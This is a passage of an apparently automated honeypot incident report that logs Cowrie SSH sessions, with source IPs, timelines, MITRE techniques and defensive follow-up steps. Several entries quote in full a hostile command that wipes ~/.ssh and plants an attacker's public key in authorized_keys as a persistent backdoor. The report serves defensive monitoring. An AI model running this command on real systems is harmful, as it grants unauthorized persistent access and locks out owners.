|---|---|
| `2026-07-02 05:53:37` | `cowrie.session.connect` |
| `2026-07-02 05:53:38` | `cowrie.client.version` |
| `2026-07-02 05:53:38` | `cowrie.client.kex` |
| `2026-07-02 05:53:39` | `cowrie.login.success` |
| `2026-07-02 05:53:41` | `cowrie.session.params` |
| `2026-07-02 05:53:41` | `cowrie.command.input` |
| `2026-07-02 05:53:42` | `cowrie.log.closed` |
| `2026-07-02 05:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c0989727233

| Field | Detail |
|---|---|
| **Source IP** | `180.75.116[.]159` |
| **First Seen** | 2026-07-02 05:54 |
| **Last Seen** | 2026-07-02 05:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:54:35` | `cowrie.session.connect` |
| `2026-07-02 05:54:35` | `cowrie.client.version` |
| `2026-07-02 05:54:35` | `cowrie.client.kex` |
| `2026-07-02 05:54:36` | `cowrie.login.success` |
| `2026-07-02 05:54:38` | `cowrie.session.params` |
| `2026-07-02 05:54:38` | `cowrie.command.input` |
| `2026-07-02 05:54:38` | `cowrie.command.failed` |
| `2026-07-02 05:54:38` | `cowrie.log.closed` |
| `2026-07-02 05:54:39` | `cowrie.session.params` |
| `2026-07-02 05:54:39` | `cowrie.command.input` |
| `2026-07-02 05:54:39` | `cowrie.session.file_download` |
| `2026-07-02 05:54:39` | `cowrie.log.closed` |
| `2026-07-02 05:54:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.75.116[.]159` to AbuseIPDB if not already reported
- [ ] Block `180.75.116[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aab358b13238

| Field | Detail |
|---|---|
| **Source IP** | `180.75.116[.]159` |
| **First Seen** | 2026-07-02 05:54 |
| **Last Seen** | 2026-07-02 05:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:54:39` | `cowrie.session.connect` |
| `2026-07-02 05:54:39` | `cowrie.client.version` |
| `2026-07-02 05:54:40` | `cowrie.client.kex` |
| `2026-07-02 05:54:41` | `cowrie.login.success` |
| `2026-07-02 05:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.75.116[.]159` to AbuseIPDB if not already reported
- [ ] Block `180.75.116[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-174ae587b07e

| Field | Detail |
|---|---|
| **Source IP** | `180.75.116[.]159` |
| **First Seen** | 2026-07-02 05:54 |
| **Last Seen** | 2026-07-02 05:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:54:41` | `cowrie.session.connect` |
| `2026-07-02 05:54:41` | `cowrie.client.version` |
| `2026-07-02 05:54:41` | `cowrie.client.kex` |
| `2026-07-02 05:54:43` | `cowrie.login.success` |
| `2026-07-02 05:54:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.75.116[.]159` to AbuseIPDB if not already reported
- [ ] Block `180.75.116[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6922ac195ab

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 05:54 |
| **Last Seen** | 2026-07-02 05:55 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:54:53` | `cowrie.session.connect` |
| `2026-07-02 05:54:54` | `cowrie.client.version` |
| `2026-07-02 05:54:54` | `cowrie.client.kex` |
| `2026-07-02 05:55:00` | `cowrie.login.success` |
| `2026-07-02 05:55:03` | `cowrie.session.params` |
| `2026-07-02 05:55:03` | `cowrie.command.input` |
| `2026-07-02 05:55:05` | `cowrie.log.closed` |
| `2026-07-02 05:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa5da17748f5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 05:57 |
| **Last Seen** | 2026-07-02 05:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:57:13` | `cowrie.session.connect` |
| `2026-07-02 05:57:13` | `cowrie.client.version` |
| `2026-07-02 05:57:13` | `cowrie.client.kex` |
| `2026-07-02 05:57:13` | `cowrie.login.success` |
| `2026-07-02 05:57:15` | `cowrie.session.params` |
| `2026-07-02 05:57:15` | `cowrie.command.input` |
| `2026-07-02 05:57:15` | `cowrie.log.closed` |
| `2026-07-02 05:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af7572ba3e58

| Field | Detail |
|---|---|
| **Source IP** | `177.155.133[.]175` |
| **First Seen** | 2026-07-02 06:00 |
| **Last Seen** | 2026-07-02 06:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:00:10` | `cowrie.session.connect` |
| `2026-07-02 06:00:10` | `cowrie.client.version` |
| `2026-07-02 06:00:10` | `cowrie.client.kex` |
| `2026-07-02 06:00:11` | `cowrie.login.success` |
| `2026-07-02 06:00:12` | `cowrie.session.params` |
| `2026-07-02 06:00:12` | `cowrie.command.input` |
| `2026-07-02 06:00:12` | `cowrie.command.failed` |
| `2026-07-02 06:00:12` | `cowrie.log.closed` |
| `2026-07-02 06:00:13` | `cowrie.session.params` |
| `2026-07-02 06:00:13` | `cowrie.command.input` |
| `2026-07-02 06:00:13` | `cowrie.session.file_download` |
| `2026-07-02 06:00:13` | `cowrie.log.closed` |
| `2026-07-02 06:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.155.133[.]175` to AbuseIPDB if not already reported
- [ ] Block `177.155.133[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c68442d11c95

| Field | Detail |
|---|---|
| **Source IP** | `177.155.133[.]175` |
| **First Seen** | 2026-07-02 06:00 |
| **Last Seen** | 2026-07-02 06:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:00:13` | `cowrie.session.connect` |
| `2026-07-02 06:00:13` | `cowrie.client.version` |
| `2026-07-02 06:00:13` | `cowrie.client.kex` |
| `2026-07-02 06:00:14` | `cowrie.login.success` |
| `2026-07-02 06:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.155.133[.]175` to AbuseIPDB if not already reported
- [ ] Block `177.155.133[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d934e960c55

| Field | Detail |
|---|---|
| **Source IP** | `177.155.133[.]175` |
| **First Seen** | 2026-07-02 06:00 |
| **Last Seen** | 2026-07-02 06:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:00:14` | `cowrie.session.connect` |
| `2026-07-02 06:00:14` | `cowrie.client.version` |
| `2026-07-02 06:00:14` | `cowrie.client.kex` |
| `2026-07-02 06:00:15` | `cowrie.login.success` |
| `2026-07-02 06:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.155.133[.]175` to AbuseIPDB if not already reported
- [ ] Block `177.155.133[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab1d545a6ba3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 06:03 |
| **Last Seen** | 2026-07-02 06:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:03:24` | `cowrie.session.connect` |
| `2026-07-02 06:03:24` | `cowrie.client.version` |
| `2026-07-02 06:03:24` | `cowrie.client.kex` |
| `2026-07-02 06:03:24` | `cowrie.login.success` |
| `2026-07-02 06:03:26` | `cowrie.session.params` |
| `2026-07-02 06:03:26` | `cowrie.command.input` |
| `2026-07-02 06:03:26` | `cowrie.log.closed` |
| `2026-07-02 06:03:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca13a732d7d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 06:06 |
| **Last Seen** | 2026-07-02 06:06 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:06:33` | `cowrie.session.connect` |
| `2026-07-02 06:06:35` | `cowrie.client.version` |
| `2026-07-02 06:06:35` | `cowrie.client.kex` |
| `2026-07-02 06:06:42` | `cowrie.login.success` |
| `2026-07-02 06:06:46` | `cowrie.session.params` |
| `2026-07-02 06:06:46` | `cowrie.command.input` |
| `2026-07-02 06:06:48` | `cowrie.log.closed` |
| `2026-07-02 06:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4252f7ddbda5

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 06:07 |
| **Last Seen** | 2026-07-02 06:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:07:23` | `cowrie.session.connect` |
| `2026-07-02 06:07:23` | `cowrie.client.version` |
| `2026-07-02 06:07:23` | `cowrie.client.kex` |
| `2026-07-02 06:07:24` | `cowrie.login.success` |
| `2026-07-02 06:07:26` | `cowrie.session.params` |
| `2026-07-02 06:07:26` | `cowrie.command.input` |
| `2026-07-02 06:07:26` | `cowrie.log.closed` |
| `2026-07-02 06:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4e258e96960

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 06:11 |
| **Last Seen** | 2026-07-02 06:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:11:57` | `cowrie.session.connect` |
| `2026-07-02 06:11:57` | `cowrie.client.version` |
| `2026-07-02 06:11:57` | `cowrie.client.kex` |
| `2026-07-02 06:11:57` | `cowrie.login.success` |
| `2026-07-02 06:11:59` | `cowrie.session.params` |
| `2026-07-02 06:11:59` | `cowrie.command.input` |
| `2026-07-02 06:11:59` | `cowrie.log.closed` |
| `2026-07-02 06:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a04bad3cea16

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 06:17 |
| **Last Seen** | 2026-07-02 06:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:17:32` | `cowrie.session.connect` |
| `2026-07-02 06:17:32` | `cowrie.client.version` |
| `2026-07-02 06:17:32` | `cowrie.client.kex` |
| `2026-07-02 06:17:32` | `cowrie.login.success` |
| `2026-07-02 06:17:34` | `cowrie.session.params` |
| `2026-07-02 06:17:34` | `cowrie.command.input` |
| `2026-07-02 06:17:34` | `cowrie.log.closed` |
| `2026-07-02 06:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d1add133997

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 06:18 |
| **Last Seen** | 2026-07-02 06:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:18:02` | `cowrie.session.connect` |
| `2026-07-02 06:18:03` | `cowrie.client.version` |
| `2026-07-02 06:18:03` | `cowrie.client.kex` |
| `2026-07-02 06:18:09` | `cowrie.login.success` |
| `2026-07-02 06:18:13` | `cowrie.session.params` |
| `2026-07-02 06:18:13` | `cowrie.command.input` |
| `2026-07-02 06:18:15` | `cowrie.log.closed` |
| `2026-07-02 06:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b87c74897cbf

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 06:20 |
| **Last Seen** | 2026-07-02 06:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:20:11` | `cowrie.session.connect` |
| `2026-07-02 06:20:11` | `cowrie.client.version` |
| `2026-07-02 06:20:11` | `cowrie.client.kex` |
| `2026-07-02 06:20:11` | `cowrie.login.success` |
| `2026-07-02 06:20:12` | `cowrie.session.params` |
| `2026-07-02 06:20:12` | `cowrie.command.input` |
| `2026-07-02 06:20:12` | `cowrie.log.closed` |
| `2026-07-02 06:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d2e9f78d35a

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 06:21 |
| **Last Seen** | 2026-07-02 06:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:21:18` | `cowrie.session.connect` |
| `2026-07-02 06:21:18` | `cowrie.client.version` |
| `2026-07-02 06:21:18` | `cowrie.client.kex` |
| `2026-07-02 06:21:19` | `cowrie.login.success` |
| `2026-07-02 06:21:20` | `cowrie.session.params` |
| `2026-07-02 06:21:20` | `cowrie.command.input` |
| `2026-07-02 06:21:21` | `cowrie.log.closed` |
| `2026-07-02 06:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2547e3af69d8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 06:29 |
| **Last Seen** | 2026-07-02 06:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:29:41` | `cowrie.session.connect` |
| `2026-07-02 06:29:42` | `cowrie.client.version` |
| `2026-07-02 06:29:42` | `cowrie.client.kex` |
| `2026-07-02 06:29:47` | `cowrie.login.success` |
| `2026-07-02 06:29:51` | `cowrie.session.params` |
| `2026-07-02 06:29:51` | `cowrie.command.input` |
| `2026-07-02 06:29:52` | `cowrie.log.closed` |
| `2026-07-02 06:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d24c1653333

| Field | Detail |
|---|---|
| **Source IP** | `189.190.244[.]176` |
| **First Seen** | 2026-07-02 06:31 |
| **Last Seen** | 2026-07-02 06:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:31:30` | `cowrie.session.connect` |
| `2026-07-02 06:31:30` | `cowrie.client.version` |
| `2026-07-02 06:31:30` | `cowrie.client.kex` |
| `2026-07-02 06:31:30` | `cowrie.login.success` |
| `2026-07-02 06:31:31` | `cowrie.session.params` |
| `2026-07-02 06:31:31` | `cowrie.command.input` |
| `2026-07-02 06:31:31` | `cowrie.command.failed` |
| `2026-07-02 06:31:31` | `cowrie.log.closed` |
| `2026-07-02 06:31:32` | `cowrie.session.params` |
| `2026-07-02 06:31:32` | `cowrie.command.input` |
| `2026-07-02 06:31:32` | `cowrie.session.file_download` |
| `2026-07-02 06:31:32` | `cowrie.log.closed` |
| `2026-07-02 06:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.190.244[.]176` to AbuseIPDB if not already reported
- [ ] Block `189.190.244[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10ce5141dc71

| Field | Detail |
|---|---|
| **Source IP** | `189.190.244[.]176` |
| **First Seen** | 2026-07-02 06:31 |
| **Last Seen** | 2026-07-02 06:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:31:32` | `cowrie.session.connect` |
| `2026-07-02 06:31:32` | `cowrie.client.version` |
| `2026-07-02 06:31:32` | `cowrie.client.kex` |
| `2026-07-02 06:31:33` | `cowrie.login.success` |
| `2026-07-02 06:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.190.244[.]176` to AbuseIPDB if not already reported
- [ ] Block `189.190.244[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b731d199e54

| Field | Detail |
|---|---|
| **Source IP** | `189.190.244[.]176` |
| **First Seen** | 2026-07-02 06:31 |
| **Last Seen** | 2026-07-02 06:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:31:33` | `cowrie.session.connect` |
| `2026-07-02 06:31:33` | `cowrie.client.version` |
| `2026-07-02 06:31:33` | `cowrie.client.kex` |
| `2026-07-02 06:31:33` | `cowrie.login.success` |
| `2026-07-02 06:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.190.244[.]176` to AbuseIPDB if not already reported
- [ ] Block `189.190.244[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52e8882dd7f5

| Field | Detail |
|---|---|
| **Source IP** | `129.121.85[.]48` |
| **First Seen** | 2026-07-02 06:33 |
| **Last Seen** | 2026-07-02 06:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:33:05` | `cowrie.session.connect` |
| `2026-07-02 06:33:05` | `cowrie.client.version` |
| `2026-07-02 06:33:05` | `cowrie.client.kex` |
| `2026-07-02 06:33:06` | `cowrie.login.success` |
| `2026-07-02 06:33:06` | `cowrie.session.params` |
| `2026-07-02 06:33:06` | `cowrie.command.input` |
| `2026-07-02 06:33:06` | `cowrie.command.failed` |
| `2026-07-02 06:33:06` | `cowrie.log.closed` |
| `2026-07-02 06:33:07` | `cowrie.session.params` |
| `2026-07-02 06:33:07` | `cowrie.command.input` |
| `2026-07-02 06:33:07` | `cowrie.session.file_download` |
| `2026-07-02 06:33:07` | `cowrie.log.closed` |
| `2026-07-02 06:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.85[.]48` to AbuseIPDB if not already reported
- [ ] Block `129.121.85[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12fa8d468d8e

| Field | Detail |
|---|---|
| **Source IP** | `129.121.85[.]48` |
| **First Seen** | 2026-07-02 06:33 |
| **Last Seen** | 2026-07-02 06:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:33:07` | `cowrie.session.connect` |
| `2026-07-02 06:33:07` | `cowrie.client.version` |
| `2026-07-02 06:33:07` | `cowrie.client.kex` |
